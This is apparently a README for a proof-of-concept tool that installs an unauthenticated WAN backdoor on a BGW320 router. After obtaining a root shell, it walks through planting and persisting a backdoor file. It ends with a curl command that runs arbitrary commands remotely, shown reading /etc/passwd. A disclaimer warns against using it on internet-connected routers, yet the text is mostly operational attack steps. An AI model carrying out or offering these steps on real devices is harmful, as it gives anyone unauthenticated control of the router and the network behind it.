# Backdoor WAN access
Do not use this on a real router connect to the internet, as the backdoor access given features no authentication. This tool is provided as a proof of concept.
1. Obtain a root shell on the bgw320.
2. Place `backdoor.ha` in `/var/sbdc/backdoor.ha` on a BGW320
3. Make the file executable `chmod 0755 /var/sbdc/backdoor.ha`
4. Add the file to pfs using `pfs -a /var/sbdc/backdoor.ha `
5. save the pfs database using `pfs -s`
6. Enjoy your WAN backdoor using a command like `echo -n "cat /etc/passwd" | curl -k -X POST --data-binary @- https://<router-wan-ip>:61001/backdoor.ha`

Optionally the script `backdoorwan.sh` can be copied and ran on the router to automate these steps.